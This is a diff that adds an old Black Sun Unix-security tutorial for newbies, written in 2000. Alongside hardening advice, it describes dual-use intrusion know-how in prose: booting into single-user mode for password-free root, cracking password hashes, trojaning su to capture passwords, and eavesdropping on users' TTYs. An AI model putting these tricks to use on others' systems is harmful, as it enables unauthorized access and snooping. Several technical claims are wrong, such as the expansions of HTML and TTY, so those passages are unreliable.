@@ -1,0 +1,870 @@
+<html>
+<head>
+<title>unix sec</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td width="693"> 
+      <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a href="%20http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I   <b>Basic Local/Remote Unix</b>   I   Written by:     /
+    >                     I  <b>Security for Unix Newbies</b>  I                  < 
+   /      <a href="mailto:black_mesa@gmx.de">Martin L.</a>       I_____________________________I   <a href="mailto:barakirs@netvision.net.il">R a v e n</a>       \
+  /___________________________>version 1.2, 5/3/2000<________________________\</pre>
+    </td>
+  </tr>
+</table>
+<p><b>&lt;--! Begin copyright bullshit !--&gt;</b><br>
+  All copyrights are reserved. You may distribute this tutorial freely, as long 
+  as you keep our names and Black Sun Research Facility's URL at the top of this 
+  tutorial. I have written this tutorial for you, the readers. But I also wish 
+  to remain the author of this guide, meaning I do not want people to change a 
+  line or two and then claim that the whole guide is theirs. If you wish to create 
+  an altered version of this tutorial, please contact me by Email - <a href="mailto:barakirs@netvision.net.il">barakirs@netvision.net.il</a>.<br>
+  <b>&lt;--! End copyright bullshit !--&gt;</b></p>
+<p><b>&lt;--! Begin disclaimer !--&gt;</b><br>
+  Yada yada yada... you know the drill. I did not write this tutorial for people 
+  to learn &quot;how to hack&quot; and crack into and possibly damage other machines. 
+  It is solely intended to teach the reader a lesson about Unix security. Also, 
+  I am not responsible to any damage caused by using any of the techniques explained 
+  in this guide.<br>
+  <b>&lt;--! End disclaimer !--&gt;</b></p>
+<p>Changes in version 1.2:<br>
+  Added a new appendix called 'Non-Standard Loggers'.</p>
+<p>Changes in version 1.1:<br>
+  Added a new appendix called 'Security Checklists'.</p>
+<p><b><font size="4">Introduction</font></b><br>
+  <br>
+  This guide is meant for Unix newbies who want to learn a little about basic 
+  Unix security, and how to secure their box. Most systems come very very insecure 
+  out-of-the-box. What is out-of-the-box (let's call it OOTB from now on), you 
+  ask? An OOTB system is a system which was just installed. All the default configurations 
+  are turned on, which means zero personalization (besides maybe a little personalization 
+  made during the installation process) and quite a lot possible security problems. 
+  Also, there are some very basic concepts that most newbie Unix users aren't 
+  familiar with. </p>
+<p>During this tutorial, I will teach you how to change default configurations, 
+  basic packet filtering, how to secure your system's networking services (or 
+  completely remove them or some of them, in case you don't need them, in order 
+  to increate your computer's security), how to use, how to avoid trojans, what 
+  are sniffers, how to maintain local security between different users in your 
+  system (if you're not the only one using this system, whether it's locally or 
+  remotely), some stuff about SSH, how to protect yourself against computer viruses 
+  under the Unix system, what are security scanners and how to use them, why you 
+  should encrypt your important data and how etc'. </p>
+<p>Now, it is advised to go through Black Sun's previous tutorials (see blacksun.box.sk) 
+  prior to reading this tutorial. They contain some basic concepts and terminology 
+  which you need to know and you're might not familiar with. Also, you should 
+  have some basic Unix knowledge and experience. If you don't have that kind of 
+  knowledge yet, we advise you to go to the local computer store and buy a basic 
+  Unix book (it shouldn't cost too much), or, if you really want to, order a specific 
+  one from the Internet (or even better: go to blacksun.box.sk/books.html and 
+  order a book from there. We get 15% of the money you pay... :-) This doesn't 
+  mean that you pay more, though. We simply get 15% out of the money you pay). 
+  Don't worry about online ordering, it's completely secure as long as you order 
+  your books from Amazon.com (they're considered the most secure E-Store on the 
+  planet, and I order lots of books from there).</p>
+<p>Oh, one last note: this tutorial is in no way a complete one (Duh! It's a BASIC 
+  tutorial, in case you havn't read the title). I included everything I could 
+  possibly think of (that is notable for a beginners guide in this field, of course). 
+  With time, I will add more chapters, so make sure you have the latest version 
+  by visiting blacksun.box.sk often or subscribing to Black Sun's mailing list 
+  (info on how to subscribe at blacksun.box.sk also).</p>
+<p>Okay, heads up! Here we go!</p>
+<p><b><font size="4">Setting The Ground</font></b><br>
+  <br>
+  First of all, I assume that you are using either RedHat Linux or Mandrake Linux. 
+  Why is that? Because most Unix newbies use either of these two distributions. 
+  Don't worry, it's no crime to use them or something, and it's not &quot;lame&quot;. 
+  Each distribution has it's advantages. RedHat and Mandrake, for example, both 
+  have simple installation and come with a lot of utilities built-in. That's okay, 
+  although I like Slackware Linux and OpenBSD better (I'll explain why in a second).</p>
+<p>Now, some of you might be asking right now &quot;but... but I have a different 
+  distribution! Will this stuff work for me too?&quot;. Before I answer this question 
+  (to the impatient ones of you, I can already say &quot;yes&quot;, but that's 
+  not the exact answer. Read on and you'll understand), I want to explain what 
+  is a distribution (otherwise known as a &quot;distro&quot; or a &quot;flavor&quot; 
+  of Unix), why there are so many of them, where you could learn about all the 
+  different distributions and how to choose the right distribution for you.</p>
+<p>Unix was first distributed freely and in open-source form. If you're not familiar 
+  with any programming language, then you're not familiar with the term &quot;source 
+  code&quot;. I'll explain.</p>
+<p>The simplest way to show you what source code is is to send you to a webpage. 
+  Take hackernews.com (a personal favorite) for example. Every common browser 
+  has an option to view the page's source from within the browser, but let's pretend 
+  you don't know how to do this or you don't even have this option within your 
+  browser. First, wait for the whole page to load. Then, save it to your hard 
+  drive, a diskette or whatever. Then, open the HTML page you've just saved with 
+  any text editor (Pico, KEdit, Emacs, Notepad, UltraEdit, whatever).</p>
+<p>Now what do you see? No more text and graphics and colors and layout, but plain 
+  good instructions. These are HTML instructions. HTML stands for Hyper Text Marquee 
+  Language, and it is the language used to create HTML pages, which can be read 
+  by your browser and used as instructions for how to build and display the web 
+  page.</p>
+<p><br>
+  The same goes with programming. To create a program, you need to know some sort 
+  fo a programming language (C, for example), and then construct the program using 
+  commands which will later be given to a compiler (which will turn the source 
+  code file into an executable binary file, or in other words, a program which 
+  you can run and play around with) or an interpreter (the program runs as source 
+  code, and gets executed by a program called an interpreter, which reads the 
+  instructions in the source code and performs them. A popular interpreted programming 
+  language is Perl. Interpreted programming languages usually run slower, but 
+  have their advantages. We won't go into that now, though).</p>
+<p>Okay, moving on. So now you know what source code is. As I've already explained, 
+  Unix was initially distributed freely and in source code form. This means that 
+  ANYONE with the right knowledge and skills can create his own version of Unix, 
+  to meet his special needs. A different version of Unix is called a distribution, 
+  a &quot;distro&quot; or a &quot;flavor&quot;.</p>
+<p>Now go to www.linuxberg.com. Pick the closest mirror site and then enter the 
+  distributions page. It will display a list of Unix distributions, each one with 
+  it's own characteristics, advantages and disadvantages. This is all nice, but 
+  what happens if people start creating versions of Unix without paying attention 
+  to compatibility issues? For example, if I would have created my own version 
+  of Unix and called ls (the command that lists all files in the current directory 
+  in console mode (text-based interface) or in a virtual console (a console within 
+  a graphical window)) &quot;list&quot; instead? This means that if someone would 
+  have made a program that called the ls command for some purpose, it wouldn't 
+  work anymore (unless I create a command called ls that calls my own command 
+  - list. But in that case, I have to make sure that list has similar rules to 
+  ls). See the problem?</p>
+<p>Also, if I go to my friend's house, which could be using a different distribution, 
+  how could I possibly use his computer if everything is completely different?</p>
+<p>This is why there are standards. Every Unix distribution has to meet these 
+  standards so it will be compatible with other versions. This is also why most 
+  (if not all) of the stuff I am about to teach here will work in all distributions. 
+  If you have a certain problem or question, ask in our message board (find it 
+  at blacksun.box.sk).</p>
+<p>Oh, almost forgot... in the beginning of this section, I have clearly stated 
+  that I like Slackware Linux and OpenBSD more than RedHat Linux and Mandrake 
+  Linux. Why is that? Simply because they have some advantages, such as even mroe 
+  stability, security, speed and encryption, and they top all the other distributions 
+  in these fields. Of course, they are much harder to work with (have you ever 
+  tried to install OpenBSD?! To a person who installed Mandrake Linux, which is 
+  the easiest to install, and is almost as easy as installing Windows 95, it would 
+  look like hell!!).</p>
+<p>Okay, let's move on to the actual security information, shall we?</p>
+<p><b><font size="4">First Thing's First: Local Security</font></b><br>
+  <br>
+  First of all, let's think: why would you want to improve your computer's local 
+  security? Well, if you're the only one using this computer, and you don't intend 
+  to let anyone into your computer (at least not intentionally), then you<br>
+  should only read this chapter for pure knowledge. But if you're running a multi-users 
+  system, you definetly should improve your local security.</p>
+<p>What is local security? Well, better local security means that different users 
+  on this computer, whether they are local users (they have local access to the 
+  computer. They use a keyboard, a monitor and what-not that are directly connected 
+  to the actual box, not through some sort of a local area network (LAN) or the 
+  Internet) or remote users (users accessing your computer, whether legally or 
+  not, using Telnet, SSH, RLogin etc' and through a local network or the Internet), 
+  you need to increate your computer's local security.</p>
+<p>Let's start with a basic lesson about file permissions.</p>
+<p><b><font size="4">Unix File Permissions And The Password File</font></b><br>
+  <br>
+  First of all, you need to learn about the way the system works with different 
+  users. Here is a mini-tutorial out of the Byte Me page at my website that will 
+  explain what and how the Unix password file works, thus explain to you a little 
+  more about this subject.</p>
+<p><b><font size="4">Password files == world readable + how do password files 
+  look like? </font></b><br>
+  <br>
+  First of all, a file that is world readable is a file that can be read by ANYONE 
+  on the system, even the most inferior user. On most systems today, the password 
+  file (usually /etc/passwd) is world readable. Does this mean ANYONE can get 
+  the encrypted passwords and decrypt them? Definetly not! A password file consists 
+  of several (or one) lines, when each line represents a user.</p>
+<p>The password file looks like this:<br>
+  username:password:uid:gid:free text:home directory:shell<br>
+  Username - the user's username.<br>
+  Password - the user's password, encrypted using altered DES encryption (can 
+  be cracked in a matter of time, though [note: we'll get to cracking the password 
+  file later]). UID - User ID. If your UID is 0, you have root priviledges (nothing 
+  can stop you, and you can even type &quot;su username&quot; (without the quotes) 
+  to become a different user. Type exit to return to your root shell after you're 
+  done. Btw SU stands for Switch User). If two users have the same UID, they'll 
+  have identical permissions.<br>
+  GID - Group ID. The same as UID, with root being GID=0. GID let's you set ownership 
+  patterns and access patterns for a group of users (or a single user) who have 
+  different or identical UIDs but have the same GID. Free text - some free text 
+  about the user. For info on how to exploit this field in order to get private 
+  information about people, read the Info Gathering tutorial here. Home directory 
+  - where the user's private configurations files are stored. Usually /root if 
+  you are root, or /usr/your-username or /home/your-username if you're another 
+  user. Shell - the program that gets executed once you log in. Usually a command 
+  interpreter (a program that receives commands from you and executes them). </p>
+<p>Now, most systems will make /etc/passwd world-readable, but don't put the passwords 
+  in it. Instead, they will put a single character, such as *. The passwords will 
+  be stored at the shadow file, which is not world-readable, and is usually stored 
+  at /etc/shadow. The shadow file is identical to the /etc/passwd file, only it 
+  has the encrypted passwords. Some shadowing programs can also improve the encryption 
+  schemes, but that's not important to us right now.</p>
+<p>The /etc/passwd has to be world readable if you want to:</p>
+<ol>
+  <li> Find out what's the username of a certain UID. Very useful in some situations. 
+    For example: each file has an owner. The owner can change access patterns 
+    for this file, or change it's ownership. Root can own all files if he/she 
+    wants to. The owner's UID is inserted into the file. Programs such as ls (ls 
+    stands for list. It views the contents of a directory. For more info about 
+    it and it's uses, type &quot;man ls&quot; without the quotes on a Unix system) 
+    can tell you who owns a file. If they don't have access to the password file 
+    (programs run with your priviledges, unless they are SUID, in which case they 
+    run with the priviledges of the user who SUIDed them. People try not to use 
+    SUID, because it poses lots of security threats), they will only be able to 
+    present you with the UID of the owner. But if they have access to the password 
+    file, they can find the appropriate username for this UID.</li>
+  <li>Find out information about people (what's their home directory, what's their 
+    shell, what's written in their free text area etc').</li>
+  <li>Etc' etc' etc'... be creative! 
+    <blockquote> 
+      <blockquote>
+        <p>EOF</p>
+      </blockquote>
+    </blockquote>
+  </li>
+</ol>
+<p>In case you're wondering, EOF stands for End Of File. This means that... well, 
+  duh! End of file! That's it, you've just finished that nice little mini-tutorial. 
+  Now I assume you want to learn how to change file permissions.</p>
+<p>So, in order to change file permissions, you need to learn how to use the chmod 
+  command. Now, I am about to guide you on the process of finding information 
+  about Unix commands by yourself. It's quite easy.</p>
+<p>Okay, let's try man first. Man stands for manual. Man is a command that displays 
+  a manual page for a specified command. The syntax is: max command. For example: 
+  man ls, man cd, man more etc'. So let's try to type man chmod. AHA! No man entry 
+  for chmod... :-/ (some systems might have a man page for chmod)</p>
+<p>Let's try using info. We type info chmod. AHA! This time, we're getting something. 
+  So let's see... it says a little about the chmod command, but it doesn't explain 
+  how to use it! Oh, wait, look at this - there are links within this guide. Simply 
+  position your cursor within a word, a couple of words or a sentence that link 
+  somewhere else (they always have a * in front of them) and hit enter. Keep following 
+  links until you learn about chmod and about file permissions.</p>
+<p><b><font size="4">unlevels</font></b><br>
+  <br>
+  I have decided to quote a nice mini-tutorial from the Byte Me page at my website 
+  instead of just writing about runlevels all over again (I don't like doing things 
+  twice).</p>
+<p>What are Linux runlevels? If you've been paying attention to what your Linux 
+  box does during startup, you should have noticed that it says: &quot;Entering 
+  runlevel x&quot; (where x is a number between 1 and 5) at one point of the bootup 
+  stage (after it mounts your root filesystem (your &quot;/&quot; directory) into 
+  read-write mode, sets up sound, finds your kernel's module dependencies (never 
+  mind that for now) etc'). A runlevel is a bootup/shutdown sequence. It consists 
+  of a list of commands to run on startup and a list of commands to run on shutdown 
+  (or when switching to different runlevels). <br>
+  Now, first of all, let's see how you can switch runlevels. Bah, that's easy. 
+  Simply type init x, where x is a number between 0 and 6. Runlevel 0 is for &quot;halt&quot; 
+  (turning off your computer, if you have APM -Advanced Power Management, and 
+  if you have APMD - APM Daemon, installed. All modern CPUs have APM), runlevel 
+  6 is for reboot and the rest are various runlevels. 5 will bootup everything 
+  - it will even automatically run X (by default, of course. You can change this). 
+  Runlevel 1 is considered the single-mode runlevel. It does the least possible 
+  (kinda like &quot;safe mode&quot; in Windows) and doesn't even require you to 
+  enter a password (but only root can switch runlevels, so you have to be either 
+  root or have physical access to the computer during startup (we'll get to that 
+  later)). <br>
+  Editing your runlevels list is different with every different distribution. 
+  Usually it would go like this: <br>
+  a) Go to /etc/rc.d/rcx.d/ (where x is the runlevel's number) and play around 
+  within this directory. It contains symbolic links (kinda like shortcuts in Windows. 
+  For more information about symbolic links (otherwise known as &quot;symlinks&quot;), 
+  type man ln) to programs (including their parameters) that will be executed, 
+  and symbolic links to programs that will be killed on shutdown. Play around 
+  to find out more (but ALWAYS make backups!!). <br>
+  You can also try this: <br>
+  b) (this should work on most Linux boxes) Switch to the runlevel you want to 
+  edit. Then type setup. Go to system services, and select/unselect the services 
+  u want to run on startup and kill on shutdown). <br>
+  Or this: <br>
+  c) The easiest way - on some distributions, such as RedHat, you will be able 
+  to type the command control-panel within an xterm (a &quot;virtual terminal&quot; 
+  - a console window within X-Windows) and get a nice little window thingi with 
+  lots of buttons and suchlikes. Find the button that says &quot;runlevel editor&quot; 
+  when you put the mouse above it for a second or two. Then click on this button 
+  and play around with the programs. I'm sure you'll figure out how to use it 
+  yourself. It's quite self-explanitory, and it contains help files and documentation 
+  if you really need help. <br>
+  Anyway, you can always try running the command: <br>
+  find / -name *rc* -print <br>
+  If none of the three specified methods didn't work, so you could see where your 
+  runlevel directories are and apply method a on them. </p>
+<p>And now, for a nice little runlevels-related hack. <br>
+  Now, if you're reading this document, you're probably a Linux newbie, so you 
+  probably use Redhat Linux, Mandrake Linux etc'. If so, you should have a prompt 
+  saying &quot;boot:&quot; or &quot;LILO boot:&quot; or &quot;LILO:&quot; when 
+  you start your computer, and you could either type Windows or Linux (you can 
+  change these names into, say, sucky-OS for Windows and Stable_and_secure_OS 
+  for Linux, or anything else you want. Use the linuxconf program to edit LILO's 
+  preferences, and use your imagination... :-) ). Now, what happens if you type 
+  linux 5? Of course! It boots up Linux in runlevel 5!! But wait! What happens 
+  if you type linux 1 or linux single? It runs on runlevel 1 - single user mode, 
+  which means... automatic root access! No password needed. :-) <br>
+  Of course, you can change runlevel 1 by going to /etc/rc.d/rc1.d and then removing 
+  the contents of this directory and copying everything from another runlevel 
+  (replace the number in rc1.d to any other runlevel number). Please read cp's 
+  manual page and make sure you're copying symbolic links as links and not as 
+  files. <br>
+  Of course, anyway, if you have local access to a Unix box (or any other box 
+  that I know of, as a matter of fact), you can boot from a floppy (unless, of 
+  course, the first boot device is a hard drive and the bios is password-protected, 
+  but these can be hacked too. Refer to this guide). </p>
+<blockquote> 
+  <blockquote> 
+    <blockquote>
+      <p>EOF</p>
+    </blockquote>
+  </blockquote>
+</blockquote>
+<p>Now, imagine that some evil cracker (e.g. your grandma... :-) ) reads this 
+  document and then locally roots your computer somehow (the verb 'to root' means 
+  'to get root access to a computer, not necessarily one that runs Unix'). Scary, 
+  huh? That was as easy as stealing a candy from a baby (not that I've ever done 
+  that... /me looks away... :-) ).</p>
+<p><b><font size="4">Cracking The Password File</font></b><br>
+  <br>
+  As you should already know by now, the password file has some encrypted text 
+  within it. Let's discuss about the encryption scheme first, shall we?</p>
+<p>Unix password file encryption is based on an altered version of DES encryption. 
+  If you will try to decode an encrypted Unix password (let's call it a hash from 
+  now on. That's the proper name for it) using standard DES decoding, you will 
+  get a null string. Nothing. Nada. Zero. No, not even zero. You simply won't 
+  get anything.</p>
+<p>So how do you open this door? With a key. :-) Key-based encryption (e.g. PGP, 
+  which stands for Pretty Good Privacy, and has very powerful encryption schemes) 
+  is an encryption scheme where you need to have a key, which is a set of letters 
+  (lowercase or uppercase), numbers, symbols etc' (it could be just numbers, symbols 
+  and lowercase letters, all letters, etc').</p>
+<p>So in Unix &quot;crypt&quot; (from now on, crypt means Unix password file encryption), 
+  the key is actually the first eight characters of the user's password (you can 
+  add extra characters to the key, which can be generated randomly, for extra 
+  security. These are called salts. I won't explain much about them here because 
+  I don't believe I know enough about them to do so), so you need the user's password 
+  to decode the hash (but if you have the user's password, why would you want 
+  to decode his hash if you already have the password? :-) ).</p>
+<p>So, crypted passwords cannot be cracked, right? WRONG! You can use a password 
+  cracker such as John the Ripper or Cracker Jack (there are both Unix versions 
+  and Windows versions. Sorry, I don't have URLs to download them) to crack the 
+  hashes. But how do these things work?</p>
+<p>A password cracker generates random passwords and then tries to break the hash 
+  by using this password as the key. If it fails, it simply tries another password 
+  until it gets it right. Password crackers can try thousands of passwords per 
+  second on modern computers.</p>
+<p>there are two methods of password cracking - brute-force and dictionary attacks. 
+  In brute-force mode, your password cracker guesses passwords systematically. 
+  You can set a minimum amount of characters for the password, and tell your cracker 
+  what to create the password out of (lowercase letters, uppercase letters, numbers, 
+  symbols etc'). In dictionary attacks, your password cracker takes words out 
+  of a simple text file called a 'dictionary file'. Each line in this file represents 
+  a single word for the password cracker to try.</p>
+<p>Dictionary files usually have an advantage over brute-force attacks, because 
+  if you know that the target's password has something to do with dogs, you could 
+  download a dictionary file about dogs. If you know it's the name of some philosopher, 
+  you could download a dictionary file containing the names of all known philosophers. 
+  You can also download all-purpose dictionaries that contain various words (these 
+  usually have the greatest chance to succeed). The best place to download wordlists 
+  from is theargon.com.</p>
+<p>So, as you can see, if someone obtains your hashes somehow, he could decode 
+  them and break into your computer. This is why all users on your system should 
+  have a long password, and preferably not a dictionary word.</p>
+<p>If you need help with using a password cracker or have any further questions, 
+  try asking them on the message board at blacksun.box.sk (it's ours, btw... :-) 
+  ).</p>
+<p><b><font size="4">Trojans</font></b><br>
+  <br>
+  Yes, trojans. Most people who read this might be thinking about Netbus, Back 
+  Orifice, Sub7 and other Windows trojans. These aren't trojans. Okay, I mean, 
+  they ARE trojans, but not this kind of trojans. They are 'remote administration 
+  trojans'. First, let's understand what this name means, and then you'll see 
+  what they have to do with Unix in general and with local<br>
+  security in particular (as well as remote security). Let's start with the word 
+  trojan:</p>
+<p>Trpjan - In the Greek mithology, There is a story about the 'trojan horse'. 
+  The Greek were trying to capture the city of Troy for a reason which is beyond 
+  this guide (you should really read the whole story or get the movie or something. 
+  It is quite good). They were camping on the outsides of Troy for about ten years 
+  and they still didn't manage to get in. Then, they came up with a brilliant 
+  plan: the whole army pretended to be leaving the area, and they left a giant 
+  wooden horse for the Trojans as some kind of a present (to honor the Trojans 
+  for being so good). Within this horse sat a couple of soldiers. When the Trojans 
+  found the giant horse, they carried it inside and then, under the cover of night, 
+  the soldiers inside it came out, opened the city's gates and let the entire 
+  Greek army get in, which eventually lead to the fall of the city of Troy.</p>
+<p>So, as you see, a trojan program is a program that does not do what it proclaims 
+  to be doing. It could either be a harmless joke (a joke program that pretends 
+  to delete your entire hard drive or any other kinds of computer joke programs) 
+  or a malicious program which could harm your system.</p>
+<p>Remote administration - To remotely administer a system means to be able to 
+  work on this system as if you had local (&quot;physical&quot;) access to it. 
+  Being able to remotely access your system (or &quot;to remotely login to it&quot;) 
+  is useful for getting files off your system, working on your system from a distant 
+  place etc'.</p>
+<p>Remote administration trojan - A trojan program that let's the author of the 
+  program, the person who sent you the program or any other person in the world 
+  access your computer and remotely administer it (this is why Remote Administration 
+  Trojans, or RATs, are often called remote administration &quot;backdoors&quot; 
+  - they open a &quot;back door&quot; for the attacker to get in). This is exactly 
+  like depositing your entire system and evertyhing on it to the hands of the 
+  attacker.</p>
+<p>The most dangerous thing about RATs would probably be that most of them (especially 
+  Netbus and Sub7) are extremely easy to use and understand, and come with one 
+  or two pages of instructions (yes, they're THAT simple), so any little kid can 
+  use them. Most of these &quot;kids&quot; have no idea what this program or other 
+  programs that do most of the work for them do, which lead to the nickname &quot;script 
+  kiddies&quot; - &quot;lamers&quot; (a lamer is a person who acts immaturely 
+  or stupidly) with programs that do all of the work for them. Technically, a 
+  script kiddie can crack into the Pentagon if he is given a program that does 
+  everything for him. But does he know how this whole thing works? Will he know 
+  what to do once he's in? I doubt it.</p>
+<p>Now, malicious trojan programs can do a lot more than that. There are also 
+  trojans that allow the attacker to have local access to any user who runs the 
+  program (if root runs it, the whole system is doomed. This is one of the reasons 
+  why no sensible system administrator would work as root all the time, and instead 
+  make himself a less-priviledged account to work with). This is useful if the 
+  attacker has an account on this system and wants to get access to some other 
+  user's files (or even root access, which means access to practically everything).</p>
+<p>Also, if you gain write access to a commonly-used application (such as su, 
+  which let's you run a sub-shell as another user by simply giving his password 
+  instead of having to relogin. SU stands for Switch User. Oh, by the way, root 
+  doesn't need to supply a password to su if he wants to gain access to some other 
+  person's account), you can trojan these applications. Let's take su for example 
+  - if you manage to change su so it'll send you every username and password which 
+  it received, you could eventually capture your target's password or even root's 
+  password.</p>
+<p>So, kids, this is why you should beware of trojans. Be very careful with what 
+  you run. Also, there are programs called checksum checkers. These programs perform 
+  periodical tests (once a day, once an hour, once a week etc, depending on how 
+  you configure them) that determine if the size of some applications (you can 
+  descelect default applications to test or add new applications by yourself) 
+  has changed. If someone has trojaned one of those applications, it's size should 
+  change, but it is also possible (although much harder) to trojan a program without 
+  affecting it's size, but that's out of the topic of this guide.</p>
+<p><b><font size="4">Unix Viruses</font></b><br>
+  <br>
+  The computer virus problem is much less harsh under the Unix platform, but if 
+  you want to keep your data intact, you should be aware of the problem, which 
+  still exists.</p>
+<p>There is an incredibly small number of viruses in the wild for the Unix operating 
+  system (a virus that is &quot;in the wild&quot; is a virus that has gone through 
+  a network of any kind and started infecting computers on this network, just 
+  like a biological virus, when it escapes a restricted laboratory environment 
+  and goes into &quot;the wild&quot; and starts infecting people). This is because 
+  virus writers are less motivated to write viruses for Unix, because of<br>
+  the following reasons:</p>
+<p>A) Most people who use Unix are more mature than other computer users. Virus 
+  creators who intend to infect other computers are immature people.</p>
+<p>B) Because of access restrictions in the Unix operating system, if a user runs 
+  a file that is infected with a virus, the virus can't go far, and it can only 
+  do what this user has priviledges to do (although, if a root-priviledged user 
+  runs a virus, it can infect the whole system and freely travel to other systems). 
+  So, because there are files that some users can access and some other users 
+  can't, Unix viruses can't spread far.</p>
+<p>Still, the problem exists, and we want to protect our data, right? This is 
+  why you should still get yourself a Unix virus scanner. Because of the extreme 
+  lack of viruses in the Unix system, there are no &quot;big titles&quot; of virus 
+  scanners. Try going to altavista.com and searching for Unix virus scanners. 
+  Download some different ones and compare the quality of their scans and the 
+  amount of resources they consume.</p>
+<p><b><font size="4">Encryption</font></b><br>
+  <br>
+  Encrypt your important files. Use PGP for better encryption.</p>
+<p>If someone penetrates your computer's security, it will be much much harder 
+  for him to get your important data if you encrypt it.</p>
+<p>For more information about encryption, read Black Sun's encryption tutorials 
+  at blacksun.box.sk (go to the tutorials page and then find the encryption section. 
+  We have some guides for beginners about PGP and encryption in general).</p>
+<p><b><font size="4">Remote Security</font></b><br>
+  <br>
+  Why would you want to improve your computer's remote security? DUH! If you ever 
+  plan to hook your computer into a LAN, the Internet or any other kind of network, 
+  you immediately increase the chance of you getting hacked. You should definetly 
+  attend to your remote security (unless you like getting your ass<br>
+  rooted).</p>
+<p>Also, you should read the local security part first, since it contains a lot 
+  of information you need to know before you read this, and also quite a few tricks 
+  that work for both local security and remote security.</p>
+<p><b><font size="4">Remote Root Logins</font></b><br>
+  <br>
+  Before I explain to you what is the issue with remote root logins and how to 
+  block them, I need to explain to you what a TTY is first.</p>
+<p>Unix is a multi-users system, right? And on multi-users systems, many users, 
+  each one with his own monitor or any other type of terminal, can work on the 
+  same computer, right?</p>
+<p>Now, this computer is obviously running more than one process (a process is 
+  a running program), since it has multiple users on it. Each process receives 
+  some input and sends out some output. Well, then, how will this computer know 
+  which input is whom's and where to direct the output of each program? You wouldn't 
+  want to receive the output of processes that other users are running, right? 
+  (well, technically, if you're a malicious cracker, you'd love to receive the 
+  output of other users' processes, but we're getting off-topic now).</p>
+<p>This is why each user has a TTY. TTY stands for Terminal TYpe. Each user has 
+  it's own TTY, which can be composed of letters and numbers. That way, the computer 
+  knows where the input comes from (from which TTY) and where to direct the output 
+  to.</p>
+<p>Okay, first, let's make an experiment. Run a text-based console of an XTerm 
+  window (a console window from within X-Windows, the popular Graphical User Interface, 
+  or GUI, of Unix systems) and type the command who. This will show who is logged 
+  into the system (his username), when he logged in and what is his TTY. By the 
+  way, if you prefer a graphical version of the who command, try typing gw within 
+  an XTerm or within a &quot;run command&quot; box in X. This program should come 
+  with the gnome window manager.</p>
+<p>Okay, let's move on. Now, that we know what TTYs are, let's edit the file /etc/securetty 
+  with a simple text editor. Now, what do we have here? We have a list of all 
+  TTYs that can log in as a root-priviledged user. My /etc/securetty file looks 
+  like this:</p>
+<p>tty1<br>
+  tty2<br>
+  tty3<br>
+  tty4<br>
+  tty5<br>
+  tty6<br>
+  tty7<br>
+  tty8</p>
+<p>Okay, let me explain myself. Your computer should have eight virtual consoles. 
+  You can switch virtual consoles by pressing ctrl+alt+F1 for console #1, ctrl+alt+F2 
+  for console #2 etc'. You can imagine how useful this could be.</p>
+<p>Consoles #7 and #8 are usually reserved for graphical displays, so if you run 
+  X, it should appear in #7, and if you run another X process, it should appear 
+  in #8.</p>
+<p>These eight local consoles have these TTYs: tty1 for #1, tty2 for #2 etc'. 
+  Now, as you can see, my /etc/securetty file contains only those local TTYs, 
+  so no remote user can login as a root-priviledged user into my computer, even 
+  if he has all the usernames and the passwords.</p>
+<p>Now, of course, if someone has all the passwords, he could log in as another 
+  user and then use su to switch to root. So the /etc/securetty thing isn't exactly 
+  some fail-proof method, but it'll block off some intruders.</p>
+<p><b><font size="4">Watching Your Processes</font></b><br>
+  <br>
+  If you intend to have several users logged into your system, you should really 
+  watch for what they're running, and how much system resources they're hogging.</p>
+<p>Here are a few methods to watch your users:</p>
+<p><b><font size="4">Using PS</font></b><br>
+  <br>
+  Type in the command ps -aux. Quite a list, huh? Now, if you want it to be more 
+  readable, try doing ps -aux | more or directing it's output into a file, like 
+  this: ps -aux &gt; some-file-name. If you want to look for specific entries 
+  within this list, try doing ps -aux | grep some-text and it'll display lines 
+  within the output of ps -aux that contain some-text (or whatever you type in).</p>
+<p>Oh, by the way, as far as I know, PS stands for ProcesseS.</p>
+<p><b><font size="4">Using Top</font></b><br>
+  <br>
+  Type the command top. Cool program, huh? Quite useful... you should have a whole 
+  virtual console or a whole XTerm devoted exclusively for it.</p>
+<p>If you prefer a graphical display, try typing gtop (a graphical version of 
+  top that comes with the gnome window manager) or kpm (stands for KDE Process 
+  Manager. Comes with the KDE window manager).</p>
+<p><b><font size="4">Eavasdropping</font></b><br>
+  <br>
+  If you're a root-priviledged user and you want to see what the other users on 
+  your system are typing, consider using a command called TTY Watch. It will eavasdrop 
+  on the TTY of the user(s) you choose to eavasdrop on, and let you know exactly 
+  what they're typing and exactly what they see on their monitors.</p>
+<p>Try searching for the latest version of ttywatch at Packet Storm Security (packetstorm.securify.com), 
+  Security Focus (securityfocus.com), Linux.Box (linux.box.sk), Astalavista (astalavista.box.sk) 
+  etc'.</p>
+<p><b><font size="4">Playing With INetD</font></b><br>
+  <br>
+  First of all, you need to learn what network daemons are and what INetD is.</p>
+<p>A daemon is a program similar to TSR programs on Microsoft platforms. TSR stands 
+  for Terminate and Stay Resident. TSRs locate themselves on your computer's memory, 
+  and then stay silent and watch everything. Once certain credentials are met, 
+  the program awakes and does something. For example: when your free disk space 
+  reaches less than, say, 200MBs, the program alerts you.</p>
+<p>A daemon is the Unix equivelant of Microsoft's TSRs (well, actually, Unix and 
+  it's daemons were around waaaaaaaaay before Microsoft DOS and later Microsoft 
+  Windows started selling). So what is a network daemon? Well, obviously, it's 
+  a daemon that watches for certain credentials that have something to do with 
+  networks. Here are several examples:</p>
+<p>Example #1: The telnet daemon. Usually listens for incoming connections on 
+  port 23, and then, once this credential is met, it displays a login screen to 
+  the second party. Once the second party enters the correct combination of a 
+  username and a password, it is given a shell environment, where it can interact 
+  with your computer and run commands on it.</p>
+<p>Example #2: The FTP daemon. FTP stands for File Transfer Protocol, and makes 
+  it easier for different computers to exchange computer files. More info on my 
+  FTP security for extreme newbies tutorial (blacksun.box.sk/ftp.txt).</p>
